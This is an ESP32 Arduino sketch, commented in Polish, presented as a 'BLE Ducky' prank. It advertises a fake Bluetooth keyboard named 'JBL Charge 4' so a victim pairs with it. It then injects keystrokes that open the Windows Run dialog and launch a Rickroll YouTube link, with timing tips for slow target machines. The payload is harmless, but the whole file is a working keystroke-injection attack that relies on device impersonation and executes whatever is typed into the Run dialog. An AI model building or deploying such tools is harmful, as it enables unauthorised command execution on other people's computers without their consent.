//Przed wgraniem nalezy zaaktualizwoac system do stablinej wersji 2.0.17
//ponieważ w nowszych wersjach moduł ten nie zadziała


#include <BleKeyboard.h>

//Utowrzenie wirutalnej klawiatury
//1. Nazawa ktora zobaczy ofiara w Bluetooth
//2. Producent 
//3. Poziom baterii 

BleKeyboard bleKeyboard("JBL Charge 4", "JBL", 100);

//Zmienna okreslajaca to czy prank jest wykonany po podlaczeniu

bool prankWykonany = false;
bool byloPodlaczone = false;

void setup() {
  Serial.begin(115200);
  Serial.println("Uruchamianie narzezia BLE Ducky...");

  //wlaczenie modulu bluetooth w ESP-32
  bleKeyboard.begin();
}

void loop() {

  //dwa warunki, 1. Czy kto sie z nami sparowal Bluetooth
  // 2. Czy prank nie byl jeszcze wykonany

  if(bleKeyboard.isConnected()){
    if(!byloPodlaczone){
      Serial.println("Wykryto cel, odliczam 4 sekundy");
      delay(3000);
      byloPodlaczone= true;
    }
  


    if(!prankWykonany) {

      Serial.println("Ofiara podlaczona. Czekam 2 sekundy");
      delay(1000);
      Serial.println("Wysylam Payload.");

      //KROK 1 win + R
      bleKeyboard.press(KEY_LEFT_GUI); //lewy klawisz windowsa
      bleKeyboard.press('r'); //r
      delay(150);
      bleKeyboard.releaseAll(); // puszczamy klawisze
      delay(500);

      //KROK 2. Link do yt

     // Wpisujemy link LITERKA PO LITERCE (bezpieczne dla Bluetooth)
      String link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
      for(int i = 0; i < link.length(); i++) {
        bleKeyboard.print(link[i]);
        delay(100); // 25 milisekund przerwy daje Windowsowi czas na oddech
      }
      
      bleKeyboard.releaseAll(); // Zabezpieczenie: "Zdejmij wszystkie palce z klawiatury!"
      delay(100);
      
      // Wciskamy Enter
      bleKeyboard.write(KEY_RETURN);
      bleKeyboard.releaseAll();

      // Wciskamy Enter (TYLKO RAZ!), żeby zatwierdzić link w oknie "Uruchom"
      bleKeyboard.write(KEY_RETURN);
      bleKeyboard.releaseAll();

      // --- NOWY KROK: WYMUSZENIE ODTWARZANIA ---
      Serial.println("Czekam, az przegladarka zaladuje YouTube'a...");
      
      // Dajemy komputerowi aż 5 sekund (5000 ms) na pełne załadowanie strony. 
      // Jeśli komputer ofiary jest wolny, możesz to zwiększyć nawet do 7000.
      delay(5000); 

      // Wciskamy Enter ponownie, aby odpalić film na środku ekranu!
      bleKeyboard.write(KEY_RETURN); 
      bleKeyboard.releaseAll();
      // ------------------------------------------

      Serial.println("Mischief Managed.");
      prankWykonany=true;
   }
  }

  else {
    if(byloPodlaczone){
      Serial.println("Cel zgubiony.");
      //restart systemu
      byloPodlaczone = false;
      prankWykonany = false;
      delay(1000);
    }
  }

}

